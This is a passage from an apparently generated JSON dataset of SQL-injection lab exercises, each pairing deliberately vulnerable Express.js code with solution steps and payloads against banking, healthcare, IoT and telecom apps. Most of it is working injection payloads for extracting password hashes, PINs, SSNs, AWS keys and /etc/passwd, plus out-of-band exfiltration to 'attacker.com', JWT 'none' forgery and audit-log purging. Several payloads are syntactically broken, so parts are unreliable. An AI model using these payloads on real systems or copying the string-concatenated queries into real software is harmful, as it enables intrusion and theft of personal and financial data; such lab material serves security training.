      "prod' UNION SELECT sql,NULL FROM sqlite_master--"
    ]
  },
  {
    "Lab scenario": "Banking portal OOB UNION-based SQL injection in audit logs",
    "Lab Description": "Audit log retrieval endpoint uses the `id` parameter in a MySQL query unsafely. OOB DNS exfiltration is possible via `LOAD_FILE` and a DNS-triggered webhook. To solve: exfiltrate administrator password hash using out-of-band injection.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use sqlmap with `--dns-domain=attacker.com` against `/logs?id=1`",
      "Validate by injecting `' AND 1=1--` and observing normal response",
      "Craft OOB payload: `1' UNION SELECT password,LOAD_FILE('/etc/passwd') FROM users WHERE username='admin'--`",
      "Refine to ensure the DNS request is sent",
      "Verify exfiltration via your DNS logs on `attacker.com`"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst { Pool } = require('mysql');\nconst app = express();\nconst pool = new Pool({ /* conn */ });\napp.get('/logs', (req, res) => {\n  const id = req.query.id;\n  const query = `SELECT entry FROM audit_logs WHERE id='${id}'`; // vulnerability\n  console.log(query);\n  pool.query(query, (err, results) => {\n    if(err) return res.status(500).send(err.sqlMessage);\n    res.json(results);\n  });\n});\napp.listen(3000);",
    "payloads": [
      "1' UNION SELECT password,LOAD_FILE('/etc/passwd') FROM users WHERE username='admin'--",
      "1' UNION SELECT password,CONCAT(username,'.attacker.com') FROM users--"
    ]
  },
  {
    "Lab scenario": "User login Boolean-based blind SQL injection in banking portal",
    "Lab Description": "Login endpoint uses unsanitized `username` and `password` in an SQLite query. No error messages are shown, but login success/failure differs. To solve: infer the administrator's password length and characters via Boolean-based blind SQL injections.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use BurpSuite to intercept POST `/login` with `username` and `password` fields",
      "Validate vulnerability by injecting `admin' OR '1'='1` and observing login success",
      "Craft Boolean-based payload to test length: `admin' AND LENGTH(password)>6--`",
      "Iterate length and character positions using substring tests",
      "Verify full password by logging in with the discovered credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: false }));\nconst db = new sqlite3.Database(':memory:');\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users(username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users(username,password) VALUES ('administrator','s3cr3t')\");\n});\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`; // vulnerability\n  db.get(query, [], (err, row) => {\n    if(row) res.send('Login successful'); else res.send('Invalid credentials');\n  });\n});\napp.listen(3000);",
    "payloads": [
      "administrator' OR '1'='1--",
      "administrator' AND LENGTH(password)>5--",
      "administrator' AND SUBSTR(password,1,1)='s'--"
    ]
  },
  {
    "Lab scenario": "IoT dashboard Boolean-based blind SQL injection in HAVING clause",
    "Lab Description": "Device analytics endpoint uses a `HAVING` clause with unsanitized input. Responses return HTTP200 if rows exist and 404 otherwise, without errors. To solve: extract API keys via Boolean-based blind injections in the `having` parameter.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASPZAP to send POST `/analytics` with JSON `{ \"having\": \"1=1\" }`",
      "Validate vulnerability by changing to `1=2` and observing 404",
      "Craft payload: `1=1 AND SUBSTR(api_key,1,1)='A'` and observe status",
      "Automate full key extraction via scripted requests",
      "Verify the key by authenticating to the device API"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\napp.use(bodyParser.json());\nconst db = new sqlite3.Database(':memory:');\napp.post('/analytics', (req, res) => {\n  const having = req.body.having;\n  const query = `SELECT device_id FROM readings GROUP BY device_id HAVING ${having}`; // vulnerability\n  db.all(query, [], (err, rows) => {\n    res.status(rows.length>0?200:404).send();\n  });\n});\napp.listen(3000);",
    "payloads": [
      "1=1 AND SUBSTR(api_key,1,1)='A'",
      "1=1 AND LENGTH(api_key)>10"
    ]
  },
  {
    "Lab scenario": "CMS header-based Boolean blind SQL injection in audit logs",
    "Lab Description": "Audit middleware logs the `X-Forwarded-For` header directly into an INSERT without sanitization. It suppresses errors but uses UUID generation time as a proxy: longer insertion times indicate true conditions. To solve: extract admin password hash using Boolean blind injections and timing side channels.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use BurpSuite to send requests with modified `X-Forwarded-For` header",
      "Validate vulnerability by injecting `X-Forwarded-For: 1' OR 1=1--` and observing UUID time difference",
      "Craft Boolean payload: `1' AND SUBSTR(password,1,1)='a'--` and measure response time",
      "Automate full hash extraction via timing measurements",
      "Verify the hash by logging in as admin"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mysql = require('mysql');\nconst app = express();\nconst conn = mysql.createConnection({/*...*/});\napp.use((req, res, next) => {\n  const ip = req.headers['x-forwarded-for'];\n  const query = `INSERT INTO audit_logs(ip) VALUES ('${ip}')`; // vulnerability\n  console.log(query);\n  conn.query(query);\n  next();\n});\napp.listen(3000);",
    "payloads": [
      "1' OR 1=1--",
      "1' AND SUBSTR(password,1,1)='a'--"
    ]
  },
  {
    "Lab scenario": "Social media Boolean-based blind SQL injection in DM search",
    "Lab Description": "Direct message search uses unsanitized input in a SQLServer `CONTAINS` predicate. No errors are shown, but the number of emoji reactions in responses indicate true/false. To solve: extract OAuth token characters via Boolean blind injections.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Fiddler to intercept POST `/search-dms` with body `{ \"q\": \"test\" }`",
      "Validate by injecting `test' OR 1=1--` and observing increased reaction count",
      "Craft Boolean payload: `test' AND ASCII(SUBSTRING(token,1,1))>100--`",
      "Automate token extraction by iterating ASCII ranges",
      "Verify the token via OAuth introspection endpoint"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sql = require('mssql');\nconst app = express();\napp.use(express.json());\napp.post('/search-dms', async (req, res) => {\n  const term = req.body.q;\n  const query = `SELECT * FROM messages WHERE CONTAINS(text,'${term}')`; // vulnerability\n  console.log(query);\n  const result = await sql.query(query);\n  res.json({ count: result.recordset.length });\n});\napp.listen(3000);",
    "payloads": [
      "test' AND ASCII(SUBSTRING(token,1,1))>100--",
      "test' AND EXISTS(SELECT 1 FROM oauth_tokens WHERE username='admin')--"
    ]
  },
  {
    "Lab scenario": "API gateway Boolean-based blind SQL injection in JSON filters",
    "Lab Description": "Inventory search endpoint takes a JSON array of filter strings, concatenates them into a MySQL `WHERE` clause, and leaks full error messages. No direct errors are shown, but differing HTTP status codes indicate true/false. To solve: extract AWS secret key characters via Boolean blind injections in JSON filters.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send POST `/api/search` with JSON `{ \"filters\": [\"1=1\"] }`",
      "Validate by injecting `\"1=2\"` and observing 404 status",
      "Craft Boolean payload: `\"1=1 AND SUBSTR(secret_key,1,1)='A'\"`",
      "Automate extraction by iterating through characters",
      "Verify key by accessing S3 with the discovered credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst { Pool } = require('mysql');\nconst app = express();\napp.use(express.json());\nconst pool = new Pool({/*...*/});\napp.post('/api/search', (req, res) => {\n  const filters = req.body.filters.join(' AND ');\n  const query = `SELECT * FROM products WHERE ${filters}`; // vulnerability\n  console.log(query);\n  pool.query(query, (err, rows) => {\n    res.status(err?404:200).send(err?err.sqlMessage:rows);\n  });\n});\napp.listen(3000);",
    "payloads": [
      "1=1 AND SUBSTR(secret_key,1,1)='A'",
      "1=1 AND LENGTH(secret_key)>10"
    ]
  },
  {
    "Lab scenario": "Educational platform time-based SQL injection in enrollment",
    "Lab Description": "Course enrollment endpoint takes `student_id` unsafely in an SQLite query. The application returns identical pages, but time delays (via `randomblob`) reveal true conditions. To solve: extract exam answer characters via time-based inference.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use BurpSuite to intercept POST `/enroll` with `student_id`",
      "Validate by injecting `' OR CASE WHEN 1=1 THEN randomblob(100000000) ELSE 0 END--` and observing a delay",
      "Craft payloads testing ASCII codes: `' OR CASE WHEN ASCII(SUBSTR(answer,1,1))=65 THEN randomblob(100000000) ELSE 0 END--`",
      "Automate character extraction via timing measurements",
      "Verify answers by logging into the student portal"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: false }));\nconst db = new sqlite3.Database(':memory:');\ndb.serialize(() => {\n  db.run(\"CREATE TABLE courses(student_id TEXT, answer TEXT)\");\n});\napp.post('/enroll', (req, res) => {\n  const id = req.body.student_id;\n  const query = `SELECT * FROM courses WHERE student_id='${id}'`; // vulnerability\n  console.log(query);\n  db.all(query, [], (err, rows) => { res.send(rows.length? 'Enrolled':'Invalid'); });\n});\napp.listen(3000);",
    "payloads": [
      "' OR CASE WHEN 1=1 THEN randomblob(100000000) ELSE 0 END--",
      "' OR CASE WHEN ASCII(SUBSTR(answer,1,1))=65 THEN randomblob(100000000) ELSE 0 END--"
    ]
  },
  {
    "Lab scenario": "Healthcare portal time-based SQL injection in get-medications",
    "Lab Description": "Patient portal uses an Oracle query to retrieve medications by `patientId` without sanitization. Responses return HTTP200 or 404 based on row count; time delays (via `DBMS_PIPE.RECEIVE_MESSAGE`) reveal true conditions. To solve: extract allergy info characters via time-based inference.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASPZAP to intercept POST `/get-medications` with `id`",
      "Validate by injecting `' OR DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--` and observing delay",
      "Craft payload: `' OR CASE WHEN ASCII(SUBSTR(allergy_info,1,1))=65 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE NULL END--`",
      "Automate full extraction via timing scripts",
      "Verify results by accessing patient records"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst oracledb = require('oracledb');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: false }));\napp.post('/get-medications', async (req, res) => {\n  const id = req.body.id;\n  const query = `SELECT drug_name FROM prescriptions WHERE patient_id='${id}'`; // vulnerability\n  console.log(query);\n  try {\n    const result = await oracledb.getConnection().then(c => c.execute(query));\n    res.status(result.rows.length?200:404).send();\n  } catch(e) { res.status(500).send(); }\n});\napp.listen(3000);",
    "payloads": [
      "' OR DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--",
      "' OR CASE WHEN ASCII(SUBSTR(allergy_info,1,1))=65 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE NULL END--"
    ]
  },
  {
    "Lab scenario": "Banking portal time-based SQL injection in account balance query",
    "Lab Description": "Balance check endpoint takes `id` unsafely into an SQLite query. Identical responses are returned except for time delay when `SLEEP` is invoked. To solve: infer account balance digits via time-based injections.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use BurpSuite to intercept GET `/balance?id=1`",
      "Validate by injecting `1' OR 1=1 SLEEP(5)--` and observing a delay",
      "Craft payload: `1' OR CASE WHEN balance>1000 THEN SLEEP(5) ELSE NULL END--`",
      "Automate balance extraction by adjusting thresholds",
      "Verify the balance in the JSON response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\nconst db = new sqlite3.Database(':memory:');\ndb.serialize(() => { db.run(\"CREATE TABLE accounts(id INTEGER, balance INTEGER)\"); db.run(\"INSERT INTO accounts(id,balance) VALUES (1,2000)\"); });\napp.get('/balance', (req, res) => {\n  const id = req.query.id;\n  const query = `SELECT balance FROM accounts WHERE id='${id}'`; // vulnerability\n  console.log(query);\n  db.get(query, [], (err, row) => { res.json({ balance: row?row.balance:'N/A' }); });\n});\napp.listen(3000);",
    "payloads": [
      "1' OR 1=1 SLEEP(5)--",
      "1' OR CASE WHEN balance>1000 THEN SLEEP(5) ELSE NULL END--"
    ]
  },
  {
    "Lab scenario": "OAuth callback time-based SQL injection in banking app",
    "Lab Description": "OAuth callback endpoint uses `state` directly in an SQLite query. Identical redirects occur, but time delays (via `randomblob`) reveal true conditions. To solve: extract user PIN digits via time-based inference on the `state` parameter.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Charles Proxy to intercept GET `/oauth/callback?state=XYZ`",
      "Validate by injecting `XYZ' OR randomblob(100000000) ELSE NULL END--` and observing delay",
      "Craft payload: `XYZ' OR CASE WHEN SUBSTR(pin,1,1)='5' THEN randomblob(100000000) ELSE NULL END--`",
      "Automate extraction of each PIN digit via timing",
      "Verify PIN by logging in to the user dashboard"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\nconst db = new sqlite3.Database(':memory:');\ndb.serialize(() => { db.run(\"CREATE TABLE oauth_states(state TEXT, user_id INTEGER)\"); });\napp.get('/oauth/callback', (req, res) => {\n  const state = req.query.state;\n  const query = `SELECT user_id FROM oauth_states WHERE state='${state}'`; // vulnerability\n  console.log(query);\n  db.get(query, [], (err, row) => { if(row) res.redirect('/dashboard'); else res.status(400).send('Invalid'); });\n});\napp.listen(3000);",
    "payloads": [
      "XYZ' OR randomblob(100000000)--",
      "XYZ' OR CASE WHEN SUBSTR(pin,1,1)='5' THEN randomblob(100000000) ELSE NULL END--"
    ]
  },
  {
    "Lab scenario": "Banking Portal UNION-Based SQLi in Transaction Sorting",
    "Lab Description": "A financial application constructs ORDER BY clauses using unsanitized user input in transaction history queries. The PostgreSQL backend leaks column types through verbose error messages containing full query syntax. To solve: Extract SHA-256 hashed account PINs from the vault table while bypassing JSON output encoding using explicit type casting and NULL padding in UNION payloads.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept GET /transactions?sort=amount with Burp Suite",
      "Determine column count using ' ORDER BY 7--' until syntax error occurs",
      "Craft payload: amount UNION SELECT NULL,ENCODE(pin_hash::bytea,'base64'),NULL,NULL,NULL,NULL,NULL FROM vault--",
      "Bypass WAF using %09 tab encoding for whitespace",
      "Decode base64 results using CyberChef and validate through PBKDF2 cracking"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst pool = require('./db').pool;\n\napp.get('/transactions', (req, res) => {\n  const sort = req.query.sort || 'id';\n  const query = `SELECT id,amount,recipient,date,status,currency,user_id\n    FROM transactions ORDER BY ${sort}`;\n  \n  pool.query(query, (err, result) => {\n    if(err) {\n      console.error(`Full query: ${query}\\nError: ${err.stack}`);\n      res.status(500).send('Payment system error');\n    } else {\n      res.json(result.rows);\n    }\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL,pg_read_file('/etc/passwd')::text,NULL,NULL,NULL,NULL,NULL--",
      "amount%09UNION%09SELECT%09NULL,current_setting('aws.keys'),NULL,NULL,NULL,NULL,NULL--",
      "' ORDER BY (SELECT 1 FROM pg_sleep(2))--"
    ]
  },
  {
    "Lab scenario": "IoT Device Manager Boolean-Based SQLi in Sensor Filter",
    "Lab Description": "An industrial control system processes unsanitized group IDs in HAVING clauses of SQLite queries. The REST API returns HTTP 200/404 status codes through misconfigured row existence checks. To solve: Extract AWS IoT Core certificates via bitwise binary search of SUBSTR(hex(cert),1,1) comparisons using automated response analysis.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Fuzz POST /telemetry endpoint with OWASP ZAP",
      "Identify boolean trigger: ' HAVING 1=1 AND (SELECT hex(substr(cert,1,1)) FROM iot_certs)='41'--",
      "Automate with sqlmap: sqlmap -u ... --technique=B --level=5",
      "Brute-force 256-bit keys using Python Requests with bit-shifting logic",
      "Validate certificates through MQTT publish command"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/telemetry', (req, res) => {\n  const filter = req.body.having;\n  const query = `SELECT sensor_id FROM readings\n    GROUP BY sensor_id HAVING ${filter}`;\n  \n  db.get(query, (err, row) => {\n    res.status(row ? 200 : 404).send();\n  });\n});",
    "payloads": [
      "1=1 AND (SELECT COUNT(*) FROM sqlite_master WHERE tbl_name='credentials')=1--",
      "EXISTS(SELECT 1 FROM iot_certs WHERE device_type='critical')--"
    ]
  },
  {
    "Lab scenario": "Industrial IoT Boolean-Based SQLi in Sensor Filter",
    "Lab Description": "A Modbus-TCP sensor network dashboard uses unsanitized HAVING clauses in SQLite queries. The REST API returns HTTP 200/404 through row existence checks. To solve: Extract encryption keys via BITAND() comparisons of SUBSTR(hex(key),1,1) values with Python automation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Fuzz POST /sensor-filter endpoint with OWASP ZAP",
      "Identify boolean trigger: ' HAVING 1=1 AND (SELECT hex(substr(key,1,1)) FROM devices)='41'--",
      "Automate with Python Requests and bitwise analysis",
      "Brute-force 256-bit keys using response differentials",
      "Decrypt MQTT traffic using extracted keys"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/sensor-filter', (req, res) => {\n  const filter = req.body.having;\n  const query = `SELECT sensor_id FROM readings\n    GROUP BY sensor_id HAVING ${filter}`;\n  \n  db.get(query, (err, row) => {\n    res.status(row ? 200 : 404).send();\n  });\n});",
    "payloads": [
      "1=1 AND (ASCII(SUBSTR(key,1,1)) & 128)=128",
      "EXISTS(SELECT 1 FROM sqlite_master WHERE tbl_name='encryption_keys')--"
    ]
  },
  {
    "Lab scenario": "Banking App Time-Based SQLi in OAuth Flow",
    "Lab Description": "An OAuth 2.0 handler incorporates state parameters directly into SQLite queries. The Go backend leaks query execution time through improper transaction timing. To solve: Exfiltrate transaction PINs using CASE WHEN delays and statistical response analysis.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept GET /oauth/callback?state=123 with Charles Proxy",
      "Identify timing trigger: ' OR CASE WHEN 1=1 THEN randomblob(1000000) ELSE 0 END--",
      "Automate with sqlmap --time-sec=5 --technique=T",
      "Brute-force 6-digit PIN using binary search",
      "Validate through ATM simulator API"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/oauth/callback', (req, res) => {\n  const state = req.query.state;\n  const query = `SELECT user_id FROM oauth_states\n    WHERE state='${state}'`;\n  \n  db.get(query, (err, row) => {\n    if (row) res.redirect('/dashboard');\n    else res.status(400).send('Invalid state');\n  });\n});",
    "payloads": [
      "' OR CASE WHEN (SUBSTR(pin,1,1)='5' THEN randomblob(1000000) ELSE 0 END--",
      "' AND (SELECT LENGTH(pin) FROM users WHERE username='admin')=6--"
    ]
  },
  {
    "Lab scenario": "Healthcare Portal UNION SQLi in Radiology Export",
    "Lab Description": "A DICOM report viewer concatenates user input into PostgreSQL ORDER BY clauses. The application leaks sensitive metadata through verbose COPY errors. To solve: Extract encrypted diagnoses using NULL-padded UNION payloads and hex encoding with CHR(9) bypass.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept GET /reports?sort=date with Burp Suite",
      "Determine column count using ORDER BY 4--",
      "Craft payload: date UNION SELECT NULL,ENCODE(diagnosis::bytea,'hex'),NULL,NULL--",
      "Bypass CSV formatting using tab separators",
      "Reconstruct diagnoses from hex responses"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/reports', (req, res) => {\n  const sort = req.query.sort || 'date';\n  const query = `SELECT * FROM radiology_reports ORDER BY ${sort}`;\n  \n  pool.query(query, (err, result) => {\n    if(err) {\n      console.error(`COPY error: ${err.message}`);\n      res.status(500).send('Report generation failed');\n    } else {\n      res.attachment('reports.csv');\n    }\n  });\n});",
    "payloads": [
      "date UNION SELECT NULL,pg_read_file('/etc/passwd'),NULL,NULL--",
      "patient_id UNION SELECT NULL,current_setting('data_directory'),NULL,NULL--"
    ]
  },
  {
    "Lab scenario": "REST API Error-Based SQLi in JWT Claims",
    "Lab Description": "User profile endpoint incorporates JWT 'sub' directly into SQL Server OPENJSON queries. The application leaks SSNs through XML conversion errors. To solve: Extract encrypted SSNs using JSON_VALUE() type mismatches and 'none' algorithm bypass.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Decode JWT using jwt.io and modify 'sub' claim",
      "Forge token: ' UNION SELECT SSN FROM patients FOR JSON PATH--",
      "Bypass signature using 'none' algorithm",
      "Parse JSON errors for SSN fragments",
      "Reconstruct full SSNs using differential analysis"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/profile', (req, res) => {\n  const userId = jwtVerify(req.headers.auth).sub;\n  const query = `SELECT * FROM users\n    WHERE id = '${userId}'`;\n  sql.query(query, (err, result) => {\n    res.json(result.recordset[0]);\n  });\n});",
    "payloads": [
      "' OR 1=CONVERT(INT, (SELECT TOP 1 SSN FROM patients))--",
      "' AND (SELECT COUNT(*) FROM sys.tables)=42--"
    ]
  },
  {
    "Lab scenario": "CMS Header-Based Blind SQLi in Audit Logs",
    "Lab Description": "Audit logging system incorporates X-Forwarded-For headers into MySQL INSERTs. The PHP backend reveals query success through UUID patterns. To solve: Extract password hashes using BENCHMARK() timing attacks and rainbow table reversal.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept request with Burp Suite and modify X-Forwarded-For",
      "Identify timing differential: ' OR BENCHMARK(1000000,MD5('test'))--",
      "Automate with Python Requests and timing thresholds",
      "Brute-force hash characters using response times",
      "Crack hashes using CrackStation API"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.use((req, res, next) => {\n  const ip = req.headers['x-forwarded-for'];\n  const query = `INSERT INTO audit_logs (ip) VALUES ('${ip}')`;\n  mysql.query(query);\n  next();\n});",
    "payloads": [
      "' OR IF(ASCII(SUBSTR(password,1,1))>97,BENCHMARK(1000000,MD5('a')),0--",
      "' AND (SELECT COUNT(*) FROM mysql.user WHERE super_priv='Y')=1--"
    ]
  },
  {
    "Lab scenario": "Telecom API Gateway UNION-Based SQLi in Call Log Sorting",
    "Lab Description": "A telecommunications REST API vulnerable to SQL injection in 'orderBy' arguments. The PostgreSQL backend requires type coercion for UNION attacks. To solve: Extract SMS content using json_agg() and hstore_to_json() conversions with CSP bypass.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture GraphQL POST request in Burp Suite",
      "Inject: 'orderBy: \"1' UNION SELECT NULL,json_agg(message_content) FROM sms_logs--\"",
      "Bypass WAF using GraphQL field aliases",
      "Decode nested JSON results",
      "Purge audit logs using stacked mutation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const resolvers = {\n  Query: {\n    calls(_, { orderBy }) {\n      return db.query(`SELECT caller_id, duration FROM calls ORDER BY ${orderBy}`);\n    }\n  }\n};",
    "payloads": [
      "\"' UNION SELECT NULL,hstore_to_json(hstore(sms_logs)) FROM sms_logs--\"",
      "\"'%00' UNION SELECT NULL,array_to_json(array_agg(message)) FROM sms_logs--\""
    ]
  },
  {
    "Lab scenario": "Education Portal Boolean-Based SQLi in Gradebook",
    "Lab Description": "A university grading system processes unsanitized group IDs in HAVING clauses. The MySQL backend returns different CSV headers for true/false conditions. To solve: Extract student SSNs through bitwise brute-force and aiohttp parallel requests.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Map injection point using OWASP ZAP",
      "Identify boolean triggers: '1'='1'-- vs '1'='2'-- via CSV headers",
      "Develop Python script with binary search pattern",
      "Optimize with aiohttp async requests",
      "Crack hashes using rainbow tables"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/grades', (req, res) => {\n  const groupId = req.query.group;\n  const query = `SELECT student_id, AVG(grade) \n               FROM assignments \n               GROUP BY student_id \n               HAVING class_id = ${groupId}`;\n  \n  pool.query(query, (err, results) => {\n    if (err || results[0].length === 0) return res.status(404).end();\n    res.attachment('grades.csv').send(results[0]);\n  });\n});",
    "payloads": [
      "' OR (SELECT MID((SELECT ssn FROM students),1,1) = 'A'--",
      "' AND (SELECT COUNT(*) FROM information_schema.tables)=42--"
    ]
  },
  {
    "Lab scenario": "Healthcare IoT Device Error-Based SQLi in Firmware",
    "Lab Description": "A medical device calibration interface vulnerable to verbose error-based injection. The MySQL backend leaks schema through constraint violations. To solve: Extract credentials through nested error-induced exfiltration and HMAC bypass.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Trigger error: GET /firmware?version=1.2.3')",
      "Extract table structure via error analysis",
      "Craft payload: ' AND 1=(SELECT 1 FROM (SELECT COUNT(*),CONCAT(credential,FLOOR(RAND(0)*2))x FROM users GROUP BY x)y)--",
      "Inject backup config with second-order payload",
      "Authenticate via SSH with compromised credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/firmware', (req, res) => {\n  const version = req.query.version;\n  const query = `SELECT * FROM firmware WHERE version = '${version}'`;\n  \n  pool.query(query, (err, results) => {\n    if (err) return res.status(500).send(err.message);\n    res.json(results[0]);\n  });\n});",
    "payloads": [
      "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT credential FROM users),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--",
      "'||MAKE_SET(1,TOKEN) IS NOT NULL--"
    ]
  },
  {
    "Lab scenario": "Banking Portal UNION-Based SQL Injection in ORDER BY Clause with WAF Bypass",
    "Lab Description": "The vulnerable banking application uses dynamic SQL queries in transaction sorting functionality without input validation. The `GET /transactions` endpoint concatenates user-controlled `sort` parameter directly into an ORDER BY clause. The WAF filters common UNION and WAITFOR DELAY keywords. To solve: 1) Bypass WAF using JSON unicode escaping 2) Determine column count with null-byte termination 3) Extract IBAN numbers from hidden accounts table 4) Maintain stealth using time-delayed exfiltration.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. (Recon) Use Burp Suite's Intruder to fuzz sort parameter with HTML-encoded characters: `GET /transactions?sort=id\u0020DESC%23`",
      "2. (Validation) Confirm injection point via error induction: `sort=(CASE WHEN 1=1 THEN id ELSE amount END)`",
      "3. (WAF Bypass) Use JSON Unicode escaping for UNION: `\u0055\u004E\u0049\u004F\u004E`",
      "4. (Column Count) Binary search with null-byte termination: `sort=1\u0020UNION\u0020SELECT\u0020NULL%00--`",
      "5. (Data Exfiltration) Time-based extraction: `sort=1 UNION SELECT IF(SUBSTR(iban,1,1)='A',SLEEP(3),NULL FROM accounts--`"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mysql = require('mysql2');\nconst app = express();\n\n// Vulnerable transaction sorting\napp.get('/transactions', (req, res) => {\n    const conn = mysql.createConnection({/* DB config */});\n    const sort = req.query.sort || 'id DESC';\n    \n    // Vulnerable ORDER BY construction\n    const query = `SELECT id, amount, date FROM transactions ORDER BY ${sort}`;\n    \n    console.log(\"Executing query:\", query); // Error leakage\n    \n    conn.query(query, (err, results) => {\n        if(err) {\n            // Detailed error exposure\n            res.status(500).json({error: err.message, stack: err.stack}); \n        } else {\n            res.json(results);\n        }\n    });\n});\n\napp.listen(3000, () => console.log('Banking API running'));",
    "payloads": [
      "sort=(SELECT 1 FROM DUAL WHERE 1=1)--",
      "sort=id\u0020UNION\u0020ALL\u0020SELECT\u0020NULL,NULL,@@version--%00",
      "sort=1\u0020PROCEDURE\u0020ANALYSE(EXTractvalue(rand(),CONCAT(0x3a,(SELECT\u0020MID(iban,1,30)\u0020FROM\u0020accounts\u0020LIMIT\u00201))))",
      "sort=1\u0020AND\u0020IF(ASCII(SUBSTR((SELECT\u0020iban\u0020FROM\u0020accounts\u0020LIMIT\u00201),1,1))=65,SLEEP(3),0"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard Boolean-Based Blind SQLi in HAVING Clause with JSON Input",
    "Lab Description": "A smart home management system vulnerable to blind SQL injection through JSON-encoded device filter parameters. The application constructs dynamic HAVING clauses from unvalidated user input. No direct error feedback but returns HTTP 204 when queries return empty. Target: Extract admin API keys from device_config table using boolean inference. Constraints: WAF blocks 'UNION' and 'SLEEP' keywords.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. (Recon) Use Postman to send JSON payload: {\"filters\":[{\"field\":\"1' AND '1'='1'--\",\"operator\":\"eq\"}]}",
      "2. (Validation) Identify boolean response via status code: 200 OK=true, 204 No Content=false",
      "3. (Bypass) Use CHAR() encoding for restricted keywords: AND ASCII(SUBSTR((SELECT @@version),1,1))>50",
      "4. (Exfil) Automate with sqlmap: sqlmap -r request.txt --batch --technique=B --hex --tamper=charunicodeescape",
      "5. (Stealth) Limit request rate to 5req/s using sqlmap's --delay parameter"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mysql = require('mysql2/promise');\nconst app = express();\napp.use(express.json());\n\n// Vulnerable device filtering\napp.post('/devices', async (req, res) => {\n  const conn = await mysql.createConnection({/* DB config */});\n  let query = 'SELECT device_id, name FROM iot_devices GROUP BY device_id HAVING ';\n  \n  req.body.filters.forEach((filter, index) => {\n    // Direct concatenation with JSON input\n    query += `${filter.field} ${filter.operator} '${filter.value}'`;\n    if(index < req.body.filters.length-1) query += ' AND ';\n  });\n\n  console.debug('Generated query:', query); // Verbose logging\n  \n  try {\n    const [rows] = await conn.query(query);\n    rows.length ? res.json(rows) : res.status(204).end();\n  } catch (err) {\n    res.status(500).json({error: err.sqlMessage}); // Error leakage\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "{\"filters\":[{\"field\":\"1' AND (SELECT ASCII(SUBSTR(api_key,1,1)) FROM device_config LIMIT 1)>96--\",\"operator\":\"eq\",\"value\":\"1\"}]}",
      "{\"filters\":[{\"field\":\"1' AND EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name=CHAR(100,101,118,105,99,101,95,99,111,110,102,105,103))--\",\"operator\":\"eq\",\"value\":\"1\"}]}",
